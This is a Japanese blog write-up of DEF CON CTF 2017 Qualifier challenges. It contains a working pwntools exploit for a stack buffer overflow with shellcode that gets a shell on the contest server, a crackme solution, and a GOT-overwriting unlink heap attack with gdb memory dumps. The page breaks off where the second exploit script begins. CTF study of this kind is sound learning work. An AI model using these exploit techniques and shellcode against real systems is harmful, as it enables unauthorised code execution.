@@ -1,0 +1,608 @@
+<!DOCTYPE HTML><html lang="ja"><head><meta charset="utf-8"><meta content="Tosainu" name="author"><meta content="[DEF CON CTF 2017 Qualifier](https://ctftime.org/event/459) に一人チーム [poepoe](https://ctftime.org/team/32588) で参加. 144 points で 117 位.Baby&#39;s First の" name="description"><meta content="Hakyll" name="generator"><meta content="width=device-width, initial-scale=1" name="viewport"><meta property="twitter:card" content="summary"><meta property="twitter:site" content="myon___"><meta property="twitter:creator" content="myon___"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/index.html"><meta property="og:title" content="DEF CON CTF 2017 Qualifier writeup | Tosainu Lab"><meta property="og:description" content="[DEF CON CTF 2017 Qualifier](https://ctftime.org/event/459) に一人チーム [poepoe](https://ctftime.org/team/32588) で参加. 144 points で 117 位.Baby&#39;s First の"><meta property="og:site_name" content="Tosainu Lab"><meta property="og:image" content="https://blog.myon.info/images/icon/cocoa-512.jpg"><title>DEF CON CTF 2017 Qualifier writeup | Tosainu Lab</title><link href="/vendor/normalize.css/normalize.css" rel="stylesheet"><link href="/stylesheets/style.css" rel="stylesheet"><link href="/stylesheets/highlight.css" rel="stylesheet"><link href="/vendor/fontawesome/style.css" rel="stylesheet"><link href="/vendor/katex/katex.min.css" rel="stylesheet"><link href="/feed.xml" title="Atom Feed" type="application/atom+xml" rel="alternate"><script async src="https://www.googletagmanager.com/gtag/js?id=G-X1CGBSMEQW"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-X1CGBSMEQW');</script></head><body><header class="site-header"><div class="container"><h1><a href="/" title="home">Tosainu Lab</a></h1></div></header><main class="post"><article><header class="post-header"><div class="container"><h1><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/">DEF CON CTF 2017 Qualifier writeup</a></h1><ul class="post-meta"><li><svg class="svg-inline--fa fa-calendar" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="calendar" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M96 32V64H48C21.5 64 0 85.5 0 112v48H448V112c0-26.5-21.5-48-48-48H352V32c0-17.7-14.3-32-32-32s-32 14.3-32 32V64H160V32c0-17.7-14.3-32-32-32S96 14.3 96 32zM448 192H0V464c0 26.5 21.5 48 48 48H400c26.5 0 48-21.5 48-48V192z" fill="currentColor"></path></svg></li><li class="date">2017/05/02 01:32</li><li><svg class="svg-inline--fa fa-tags" focusable="false" aria-hidden="true" role="img" viewBox="0 0 512 512" data-icon="tags" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M345 39.1L472.8 168.4c52.4 53 52.4 138.2 0 191.2L360.8 472.9c-9.3 9.4-24.5 9.5-33.9 .2s-9.5-24.5-.2-33.9L438.6 325.9c33.9-34.3 33.9-89.4 0-123.7L310.9 72.9c-9.3-9.4-9.2-24.6 .2-33.9s24.6-9.2 33.9 .2zM0 229.5V80C0 53.5 21.5 32 48 32H197.5c17 0 33.3 6.7 45.3 18.7l168 168c25 25 25 65.5 0 90.5L277.3 442.7c-25 25-65.5 25-90.5 0l-168-168C6.7 262.7 0 246.5 0 229.5zM144 144c0-17.7-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32s32-14.3 32-32z" fill="currentColor"></path></svg></li><li><ul class="tag-list"><li><a href="/entry/tags/ctf/"><span>CTF</span></a></li></ul></li></ul></div></header><div class="container"><div class="post-contents"><p><a href="https://ctftime.org/event/459" target="_blank" rel="nofollow noopener">DEF CON CTF 2017 Qualifier</a> に一人チーム <a href="https://ctftime.org/team/32588" target="_blank" rel="nofollow noopener">poepoe</a> で参加. 144 points で 117 位.</p>
+<p>Baby’s First の問題しか解けなかったけど, pwn するの久しぶりだったので楽しかった.<br />
+それ以外の問題も点を入れていけるようにしていくぞ💪.</p>
+<!--more-->
+<h2 id="smashme">smashme</h2>
+<p>x86-64 の ELF.</p>
+<pre><code>$ file smashme
+smashme: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=29c2093a0eca94730cd7fd861519602b3272a4f7, not stripped, with debug_info
+
+$ checksec --file smashme
+[*] &#39;/tmp/smashme&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)</code></pre>
+<p>radare2 でディスアセンブルするとこんな感じ.<br />
+超キケンな <code>gets</code> で stack に文字列を読み込んでいるため stack buffer overflow が起こせるのがわかる. ただし, その後に呼ばれる <code>sub.ifunc_4253b0_320</code> が非ゼロの値を返さないと <code>exit</code> が呼ばれてしまうので, 任意のアドレスに飛ばすには入力する文字列に細工が必要なようだ.</p>
+<pre><code>|           0x004009d6      488d45c0       lea rax, qword [rbp - local_40h]
+|           0x004009da      4889c7         mov rdi, rax
+|           0x004009dd      b800000000     mov eax, 0
+|           0x004009e2      e8e9f00000     call sym.gets              ; char*gets(char *s)
+|           0x004009e7      488d45c0       lea rax, qword [rbp - local_40h]
+|           0x004009eb      bed8064a00     mov esi, str.Smash_me_outside__how_bout_dAAAAAAAAAAA ; &quot;Smash me outside, how bout dAAAAAAAAAAA&quot; @ 0x4a06d8
+|           0x004009f0      4889c7         mov rdi, rax
+|           0x004009f3      e828f9ffff     call sub.ifunc_4253b0_320
+|           0x004009f8      4885c0         test rax, rax
+|       ,=&lt; 0x004009fb      7407           je 0x400a04
+|       |   0x004009fd      b800000000     mov eax, 0
+|      ,==&lt; 0x00400a02      eb0a           jmp 0x400a0e
+|      ||      ; JMP XREF from 0x004009fb (sym.main)
+|      |`-&gt; 0x00400a04      bf00000000     mov edi, 0
+|      |    0x00400a09      e822e00000     call sym.exit              ; void exit(int status)
+|      |       ; JMP XREF from 0x00400a02 (sym.main)
+|      `--&gt; 0x00400a0e      c9             leave
+\           0x00400a0f      c3             ret</code></pre>
+<p>この <code>sub.ifunc_4253b0_320</code> がよくわからない<a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>ので gdb で処理を追ってみたところ, <a href="http://en.cppreference.com/w/c/string/byte/strstr" target="_blank" rel="nofollow noopener"><code>strstr</code></a> に飛ぶことがわかった. <code>strstr</code> は第1引数に渡した文字列に第2引数引数に渡した文字列が含まれていたらその先頭文字のアドレスを, そうでなければ <code>NULL</code> を返す関数らしい. ということは, <code>call</code> される直前で <code>rsi</code> (第2引数) に設定されている <code>&quot;Smash me outside, how bout dAAAAAAAAAAA&quot;</code> で始まる文字列を入力すればよさそう.</p>
+<p>gdb-peda の <code>pattc</code>, <code>patto</code> コマンドを使って調べると, 入力した文字列とリターンアドレスとののオフセットは↑の文字列+33文字なのがわかった.</p>
+<pre><code>gdb-peda$ c
+Continuing.
+Welcome to the Dr. Phil Show. Wanna smash?
+Smash me outside, how bout dAAAAAAAAAAAAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
+
+...
+
+Stopped reason: SIGSEGV
+0x0000000000400a0f in main ()
+gdb-peda$ x/gx $rsp
+0x7fffffffdf48:	0x4161414145414129
+gdb-peda$ patto 0x4161414145414129
+4711118433796833577 found at offset: 33</code></pre>
+<p>そこで, その文字列のうしろに <code>0x0044611d: push rsp ; ret  ;  (2 found)</code> と shellcode をくっつけてみたところシェルを取ることができた. 作成したスクリプトと実行結果は次の通り.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python2</span></span>
+<span id="cb4-2"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-3"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="co"># DEF CON 2017 Quals : smashme</span></span>
+<span id="cb4-4"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-5"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb4-6"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> sys</span>
+<span id="cb4-7"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-8"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-8" aria-hidden="true" tabindex="-1"></a>addr_push_rsp_ret <span class="op">=</span> <span class="bn">0x0044611d</span> <span class="co"># 0x0044611d: push rsp ; ret  ;  (2 found)</span></span>
+<span id="cb4-9"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-10"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-10" aria-hidden="true" tabindex="-1"></a>context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>, arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</span>
+<span id="cb4-11"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-12"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="st">&#39;remote&#39;</span> <span class="kw">in</span> sys.argv:</span>
+<span id="cb4-13"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-13" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> remote(<span class="st">&#39;smashme_omgbabysfirst.quals.shallweplayaga.me&#39;</span>, <span class="dv">57348</span>)</span>
+<span id="cb4-14"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-14" aria-hidden="true" tabindex="-1"></a><span class="cf">else</span>:</span>
+<span id="cb4-15"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-15" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> process(<span class="st">&#39;./smashme&#39;</span>)</span>
+<span id="cb4-16"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-17"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-17" aria-hidden="true" tabindex="-1"></a>r.recvuntil(<span class="st">&#39;Welcome to the Dr. Phil Show. Wanna smash?</span><span class="ch">\n</span><span class="st">&#39;</span>)</span>
+<span id="cb4-18"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-18" aria-hidden="true" tabindex="-1"></a>buf <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
+<span id="cb4-19"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-19" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">&#39;Smash me outside, how bout dAAAAAAAAAAA&#39;</span></span>
+<span id="cb4-20"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-20" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="dv">33</span></span>
+<span id="cb4-21"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-21" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> p64(addr_push_rsp_ret)</span>
+<span id="cb4-22"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-22" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> asm(shellcraft.sh())</span>
+<span id="cb4-23"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-23" aria-hidden="true" tabindex="-1"></a>r.sendline(buf)</span>
+<span id="cb4-24"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-25"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-25" aria-hidden="true" tabindex="-1"></a>r.interactive()</span></code></pre></div>
+<pre><code>$ ./exploit.py remote
+[+] Opening connection to smashme_omgbabysfirst.quals.shallweplayaga.me on port 57348: Done
+[*] Switching to interactive mode
+$ ls
+flag
+smashme
+$ cat flag
+The flag is: You must be at least this tall to play DEF CON CTF 5b43e02608d66dca6144aaec956ec68d
+$ 
+[*] Closed connection to smashme_omgbabysfirst.quals.shallweplayaga.me port 57348</code></pre>
+<h2 id="crackme1">crackme1</h2>
+<p>x86-64 の ELF.<br />
+Alpine Linux で作られたようで, 実行には musl libc が必要.</p>
+<pre><code>$ file 4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652
+4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, stripped, with debug_info
+
+$ docker run -t -v &quot;$PWD&quot;:/work -w /work -i alpine /bin/sh        
+/work # ./4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652 
+enter code:
+nyan
+/work # </code></pre>
+<p><code>&quot;enter code:&quot;</code>と表示した後に入力を受け付けているようだが, 適当に入力しただけでは <code>exit</code> されてしまう.<br />
+それっぽい箇所をディスアセンブルするとこんな感じ. <code>&quot;sum is %ld.&quot;</code> という表示がされていないことから <code>exit</code> を呼んでいるのは <code>fcn.00000c6c</code> の中だと推測できる.</p>
+<pre><code>|           0x0000079b      488b15861820.  mov rdx, qword [obj.stdin]  ; [0x202028:8]=0x7368732e00003232 ; LEA obj.stdin ; &quot;22&quot; @ 0x202028
+|           0x000007a2      be50000000     mov esi, 0x50               ; &#39;P&#39;
+|           0x000007a7      4889df         mov rdi, rbx
+|           0x000007aa      e879ffffff     call sym.imp.fgets         ; char *fgets(char *s, int size, FILE *stream)
+|           0x000007af      4889df         mov rdi, rbx
+|           0x000007b2      e8b5040000     call fcn.00000c6c
+|           0x000007b7      488d3d170700.  lea rdi, qword str.sum_is__ld_n ; 0xed5 ; str.sum_is__ld_n ; &quot;sum is %ld.&quot; @ 0xed5
+|           0x000007be      4889c6         mov rsi, rax
+|           0x000007c1      31c0           xor eax, eax
+|           0x000007c3      e858ffffff     call sym.imp.printf </code></pre>
+<p><code>fcn.00000c6c</code> を詳しく調べていく. この関数は第1引数 <code>rdi</code> に与えられた文字列を1文字ずつ別の関数に渡し, その返り値を <code>rbx</code> に足したりしているようだ.</p>
+<pre><code>|           0x00000c6c      55             push rbp
+|           0x00000c6d      53             push rbx
+|           0x00000c6e      4889fd         mov rbp, rdi
+|           0x00000c71      4883ec08       sub rsp, 8
+|           0x00000c75      480fbe3f       movsx rdi, byte [rdi]
+|           0x00000c79      e8bdfcffff     call fcn.0000093b
+|           0x00000c7e      480fbe7d01     movsx rdi, byte [rbp + arg_1h] ; [0x1:1]=69
+|           0x00000c83      48c1f803       sar rax, 3
+|           0x00000c87      4889c3         mov rbx, rax
+|           0x00000c8a      e8c6fcffff     call fcn.00000955
+|           0x00000c8f      480fbe7d02     movsx rdi, byte [rbp + arg_2h] ; [0x2:1]=76
+|           0x00000c94      4801c3         add rbx, rax                ; &#39;#&#39;
+|           0x00000c97      48c1fb03       sar rbx, 3
+|           0x00000c9b      e8d1fcffff     call fcn.00000971</code></pre>
+<p>この別の関数というのはどれもこんな感じで, 引数が比較している値と違ったら <code>exit</code> を呼ぶというものであった. ということは, この比較している文字を見ていけば良さそう. (めんどくせえ…)</p>
+<pre><code>|           0x0000093b      4883ff79       cmp rdi, 0x79               ; &#39;y&#39; ; &#39;y&#39;
+|       ,=&lt; 0x0000093f      740e           je 0x94f
+|       |   0x00000941      4883ec08       sub rsp, 8
+|       |   0x00000945      bf01000000     mov edi, 1
+|       |   0x0000094a      e809feffff     call sym.imp.exit          ; void exit(int status)
+|       |      ; JMP XREF from 0x0000093f (fcn.0000093b)
+|       `-&gt; 0x0000094f      b8a7000000     mov eax, 0xa7               ; section_end..shstrtab
+\           0x00000954      c3             ret</code></pre>
+<p>で, その結果 <code>&quot;yes and his hands shook with ex&quot;</code> という文字列が出てきた. でもこれは Flag ではないみたい.</p>
+<p>問題文をよく見ると, 怪しい url が書かれていた. アクセスしてみると, 解答を base64 で送れと言われる. 実際にやってみると Flag が出てきた.</p>
+<pre><code>$ echo yes and his hands shook with ex | base64
+eWVzIGFuZCBoaXMgaGFuZHMgc2hvb2sgd2l0aCBleAo=
+
+$ nc crackme1_f92e0ab22352440383d58be8f046bebe.quals.shallweplayaga.me 10001
+send your solution as base64, followed by a newline
+4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652
+eWVzIGFuZCBoaXMgaGFuZHMgc2hvb2sgd2l0aCBleAo=
+The flag is: important videos best playlist Wigeekuk8
+^C</code></pre>
+<h2 id="beatmeonthedl">beatmeonthedl</h2>
+<p>x86-64 の ELF.</p>
+<pre><code>$ file beatmeonthedl
+beatmeonthedl: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, not stripped, with debug_info
+
+$ checksec --file beatmeonthedl
+[*] &#39;/tmp/beatmeonthedl&#39;
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)</code></pre>
+<p>実行してみると, まずユーザ名とパスワードを聞いてくる. これは gdb で適当な文字を入力したときの処理を追っていけば出てくる.</p>
+<pre><code>$ ./beatmeonthedl
+     __      __       .__                                  __           
+    /  \    /  \ ____ |  |   ____  ____   _____   ____   _/  |_  ____   
+    \   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \  \   __\/  _ \  
+     \        /\  ___/|  |_\  \__(  &lt;_&gt; )  Y Y  \  ___/   |  | (  &lt;_&gt; ) 
+      \__/\  /  \___  &gt;____/\___  &gt;____/|__|_|  /\___  &gt;  |__|  \____/  
+           \/       \/          \/            \/     \/                 
+    __  .__             .__         .__                 _____    __  .__            
+  _/  |_|  |__   ____   |  | _____  |__|______    _____/ ____\ _/  |_|  |__   ____  
+  \   __\  |  \_/ __ \  |  | \__  \ |  \_  __ \  /  _ \   __\  \   __\  |  \_/ __ \ 
+   |  | |   Y  \  ___/  |  |__/ __ \|  ||  | \/ (  &lt;_&gt; )  |     |  | |   Y  \  ___/ 
+   |__| |___|  /\___  &gt; |____(____  /__||__|     \____/|__|     |__| |___|  /\___  &gt;
+             \/     \/            \/                                      \/     \/ 
+  _________.__                .___              __________                __
+ /   _____/|  |__ _____     __| _/______  _  __ \______   \_______  ____ |  | __ ___________  ______
+ \_____  \ |  |  \\__  \   / __ |/  _ \ \/ \/ /  |    |  _/\_  __ \/  _ \|  |/ \// __ \_  __ \/  ___/
+ /        \|   Y  \/ __ \_/ /_/ (  &lt;_&gt; )     /   |    |   \ |  | \(  &lt;_&gt; )    &lt;\  ___/|  |  \/\___ \ 
+/_______  /|___|  (____  /\____ |\____/ \/\_/    |______  / |__|   \____/|__|_ \\___  &gt;__|    /____ &gt;
+        \/      \/     \/      \/                       \/                    \/    \/             \/ 
+Enter username: mcfly
+Enter Pass: awesnap
+I) Request Exploit.
+II) Print Requests.
+III) Delete Request.
+IV) Change Request.
+V) Go Away.
+| </code></pre>
+<p>それ以降の処理を調べていく.</p>
+<p>このプログラムは, <code>malloc(0x38)</code> した領域の確保/編集/開放, および確保した領域のリストアップができるというものだった. 気になる脆弱性は次の2つ.</p>
+<ol type="1">
+<li><code>malloc</code> は独自に組み込まれたもの (glibc じゃない) で, さらに確保した領域は実行可能になっている</li>
+<li>“Request Exploit.” や “Change Request.” の確保した領域へ書き込む処理で0x80文字も読み込んでいて heap buffer overflow が起こせる</li>
+</ol>
+<p>何となく, この手の問題によくある unlink attack して GOT overwrite するやつかなーと推測できる.</p>
+<pre><code>|      |`-&gt; 0x00401035      bf38000000     mov edi, 0x38               ; &#39;8&#39;
+|      |    0x0040103a      e89d4a0000     call sym.malloc            ;  void *malloc(size_t size)
+|      |    0x0040103f      4889c2         mov rdx, rax
+|      |    0x00401042      8b45fc         mov eax, dword [rbp - local_4h]
+|      |    0x00401045      4898           cdqe
+|      |    0x00401047      488914c5809e.  mov qword [rax*8 + obj.reqlist], rdx ; [0x609e80:8]=0x4013b2 sym.init_mparams ; LEA obj.reqlist ; obj.reqlist
+
+...
+
+|      |    0x0040108e      488b04c5809e.  mov rax, qword [rax*8 + obj.reqlist] ; [0x609e80:8]=0x4013b2 sym.init_mparams ; LEA obj.reqlist ; obj.reqlist
+|      |    0x00401096      ba80000000     mov edx, 0x80
+|      |    0x0040109b      4889c6         mov rsi, rax
+|      |    0x0040109e      bf00000000     mov edi, 0
+|      |    0x004010a3      b800000000     mov eax, 0
+|      |    0x004010a8      e873faffff     call sym.imp.read          ; ssize_t read(int fildes, void *buf, size_t nbyte)</code></pre>
+<p>ということで, <code>malloc</code>, <code>free</code> の挙動を確認しながら次のような攻撃を行なった.</p>
+<p>まず5つの領域 (buffer0 ~ buffer4 と呼ぶことにする) を確保し, buffer3, buffer1 の順で開放する. すると, heap は次のようになっていた. chunk の構造は glibc のものとだいたい同じで, <code>prev_size</code>, <code>size</code>, <code>fd</code>, <code>bk</code> に相当するメンバを持っていた. また, 開放した領域は 0x609b88 にある管理領域?が持つ chunk を先頭とする双方向循環リストになっていた.</p>
+<p>ちなみに, chunk の番号と buffer の番号がずれているが, これは chunk0 が入力したパスワードを格納するために使われているためである.</p>
+<pre><code>gdb-peda$ x/50gx 0x00db4000
+0xdb4000:	0x0000000000000000	0x0000000000000023 &lt;- chunk0
+0xdb4010:	0x0a70616e73657761	0x0000000000000000
+0xdb4020:	0x0000000000000000	0x0000000000000043 &lt;- chunk1
+0xdb4030:	0x0030726566667562	0x0000000000000000 &lt;- buffer0
+0xdb4040:	0x0000000000000000	0x0000000000000000
+0xdb4050:	0x0000000000000000	0x0000000000000000
+0xdb4060:	0x0000000000000000	0x0000000000000041 &lt;- chunk2
+0xdb4070:	0x0000000000db40e0	0x0000000000609b88
+0xdb4080:	0x0000000000000000	0x0000000000000000
+0xdb4090:	0x0000000000000000	0x0000000000000000
+0xdb40a0:	0x0000000000000040	0x0000000000000042 &lt;- chunk3
+0xdb40b0:	0x0032726566667562	0x0000000000000000 &lt;- buffer2
+0xdb40c0:	0x0000000000000000	0x0000000000000000
+0xdb40d0:	0x0000000000000000	0x0000000000000000
+0xdb40e0:	0x0000000000000000	0x0000000000000041 &lt;- chunk4
+0xdb40f0:	0x0000000000609b88	0x0000000000db4060
+0xdb4100:	0x0000000000000000	0x0000000000000000
+0xdb4110:	0x0000000000000000	0x0000000000000000
+0xdb4120:	0x0000000000000040	0x0000000000000042 &lt;- chunk5
+0xdb4130:	0x0034726566667562	0x0000000000000000 &lt;- buffer4
+0xdb4140:	0x0000000000000000	0x0000000000000000
+0xdb4150:	0x0000000000000000	0x0000000000000000
+0xdb4160:	0x0000000000000000	0x0000000000000e51
+0xdb4170:	0x0000000000000000	0x0000000000000000
+0xdb4180:	0x0000000000000000	0x0000000000000000
+gdb-peda$ x/8gx 0x0000000000609b88
+0x609b88 &lt;_gm_+200&gt;:	0x0000000000609b78	0x0000000000609b78 &lt;- top
+0x609b98 &lt;_gm_+216&gt;:	0x0000000000db4060	0x0000000000db40e0
+0x609ba8 &lt;_gm_+232&gt;:	0x0000000000609b98	0x0000000000609b98
+0x609bb8 &lt;_gm_+248&gt;:	0x0000000000609ba8	0x0000000000609ba8</code></pre>
+<p>次に buffer2 を通して chunk4 の <code>fd</code> を <code>puts</code> の GOT から 0x18 を引いた値に書き換えて,</p>
+<pre><code>gdb-peda$ x/50gx 0x00db4000
+0xdb4000:	0x0000000000000000	0x0000000000000023
+0xdb4010:	0x0a70616e73657761	0x0000000000000000
+0xdb4020:	0x0000000000000000	0x0000000000000043 &lt;- chunk1
+0xdb4030:	0x0030726566667562	0x0000000000000000 &lt;- buffer0
+0xdb4040:	0x0000000000000000	0x0000000000000000
+0xdb4050:	0x0000000000000000	0x0000000000000000
+0xdb4060:	0x0000000000000000	0x0000000000000041 &lt;- chunk2
+0xdb4070:	0x0000000000db40e0	0x0000000000609b88
+0xdb4080:	0x0000000000000000	0x0000000000000000
+0xdb4090:	0x0000000000000000	0x0000000000000000
+0xdb40a0:	0x0000000000000040	0x0000000000000042 &lt;- chunk3
+0xdb40b0:	0x4141414141414141	0x4141414141414141 &lt;- buffer2
+0xdb40c0:	0x4141414141414141	0x4141414141414141
+0xdb40d0:	0x4141414141414141	0x4141414141414141
+0xdb40e0:	0x4141414141414141	0x0000000000000041 &lt;- chunk4
+0xdb40f0:	0x0000000000609940	0x0000000000db4060
+0xdb4100:	0x0000000000000000	0x0000000000000000
+0xdb4110:	0x0000000000000000	0x0000000000000000
+0xdb4120:	0x0000000000000040	0x0000000000000042 &lt;- chunk5
+0xdb4130:	0x0034726566667562	0x0000000000000000 &lt;- buffer4
+0xdb4140:	0x0000000000000000	0x0000000000000000
+0xdb4150:	0x0000000000000000	0x0000000000000000
+0xdb4160:	0x0000000000000000	0x0000000000000e51
+0xdb4170:	0x0000000000000000	0x0000000000000000
+0xdb4180:	0x0000000000000000	0x0000000000000000
+gdb-peda$ x/8gx 0x0000000000609940
+0x609940:	0x00007f6fb21795f0	0x0000000000400ab6
+0x609950:	0x0000000000400ac6	0x00007f6fb1e2a110 &lt;- puts_got
+0x609960:	0x00007f6fb1e41d10	0x0000000000400af6
+0x609970:	0x00007f6fb1e10e00	0x00007f6fb1e459c0</code></pre>
+<p>その後 buffer4 の開放を行ったところ, chunk4 と chunk5 の結合処理 (unlink) が走り, <code>puts</code> の GOT を chunk2 のアドレスに書き換えることができた.</p>
+<pre><code>gdb-peda$ x/50gx 0x00db4000
+0xdb4000:	0x0000000000000000	0x0000000000000023
+0xdb4010:	0x0a70616e73657761	0x0000000000000000
+0xdb4020:	0x0000000000000000	0x0000000000000043 &lt;- chunk1
+0xdb4030:	0x0030726566667562	0x0000000000000000 &lt;- buffer0
+0xdb4040:	0x0000000000000000	0x0000000000000000
+0xdb4050:	0x0000000000000000	0x0000000000000000
+0xdb4060:	0x0000000000000000	0x0000000000000041 &lt;- chunk2
+0xdb4070:	0x0000000000609940	0x0000000000609b88
+0xdb4080:	0x0000000000000000	0x0000000000000000
+0xdb4090:	0x0000000000000000	0x0000000000000000
+0xdb40a0:	0x0000000000000040	0x0000000000000042 &lt;- chunk3
+0xdb40b0:	0x4141414141414141	0x4141414141414141 &lt;- buffer2
+0xdb40c0:	0x4141414141414141	0x4141414141414141
+0xdb40d0:	0x4141414141414141	0x4141414141414141
+0xdb40e0:	0x4141414141414141	0x0000000000000ed1 &lt;- chunk4
+0xdb40f0:	0x0000000000609940	0x0000000000db4060
+0xdb4100:	0x0000000000000000	0x0000000000000000
+0xdb4110:	0x0000000000000000	0x0000000000000000
+0xdb4120:	0x0000000000000040	0x0000000000000042 &lt;- chunk5 (unlinked)
+0xdb4130:	0x0034726566667562	0x0000000000000000
+0xdb4140:	0x0000000000000000	0x0000000000000000
+0xdb4150:	0x0000000000000000	0x0000000000000000
+0xdb4160:	0x0000000000000000	0x0000000000000e51
+0xdb4170:	0x0000000000000000	0x0000000000000000
+0xdb4180:	0x0000000000000000	0x0000000000000000
+gdb-peda$ x/8gx 0x0000000000609940
+0x609940:	0x00007f6fb21795f0	0x0000000000400ab6
+0x609950:	0x0000000000400ac6	0x0000000000db4060 &lt;- puts_got
+0x609960:	0x00007f6fb1e41d10	0x0000000000400af6
+0x609970:	0x00007f6fb1e10e00	0x00007f6fb1e459c0</code></pre>
+<p>このあとすぐにメニューを表示処理で <code>puts</code> が呼ばれるので, の開放を行う前に buffer0 を通して shellcode 書き込んでおけばよさそう. ただし, unlink attack 後は chunk2 の <code>fd</code> や <code>bk</code> が書き換わってしまうので, メインの shellcode は buffer0 に書き込み, chunk2 の先頭 (glibc malloc でいう <code>prev_size</code> に相当する部分) に <code>jmp -0x30</code> を置いて shellcode の先頭に飛ぶようにした.</p>
+<p>実際に作成したスクリプトと実行結果は次の通り.<br />
+攻撃では使わなかったが, 確保したバッファをリストアップする際に <code>printf</code> の <code>%s</code> を使っているのを利用して chunk4 の <code>bk</code> のリークなども行なっている.</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb17-1"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python2</span></span>
+<span id="cb17-2"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-3"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="co"># DEF CON 2017 Quals : beatmeonthedl</span></span>
